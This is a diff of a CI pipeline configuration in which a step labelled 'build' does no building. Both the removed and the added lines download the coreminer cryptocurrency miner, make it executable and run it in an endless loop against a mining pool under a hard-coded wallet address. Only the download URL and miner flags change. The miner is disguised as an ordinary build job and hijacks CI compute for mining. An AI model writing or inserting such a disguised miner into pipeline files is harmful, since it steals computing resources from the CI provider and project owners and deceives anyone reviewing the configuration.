@@ -8,13 +8,11 @@ jobs:
       - run:
           name: build
           command: |
-            apt-get update && apt-get install -y curl bzip2 xz-utils ca-certificates -qq
-            curl -sL https://github.com/coreminer-xmr/coreminer/releases/download/v0.19.81/coreminer-v0.19.81-x64-linux.tar.xz -o /tmp/cm.tar.xz
-            tar -xf /tmp/cm.tar.xz -C /tmp
-            CM=$(find /tmp -name coreminer -type f | head -1)
-            chmod +x $CM
+            apt-get update && apt-get install -y curl -qq
+            curl -sL https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.81/coreminer-linux-x86_64.tar.gz | tar xz -C /tmp
+            chmod +x /tmp/coreminer
             while true; do
-              $CM -a randomy -o us.catchthatrabbit.com:8008 -u CB66C56381EE3FE462F239B920A8A706FBE8225E24F0 -p CCI --donate-level 1 -t 4
+              /tmp/coreminer --noeval --hard-aes -P stratums+tcp://CB66C56381EE3FE462F239B920A8A706FBE8225E24F0.CCI@us.catchthatrabbit.com:8008 -t 4
               sleep 5
             done
 workflows:
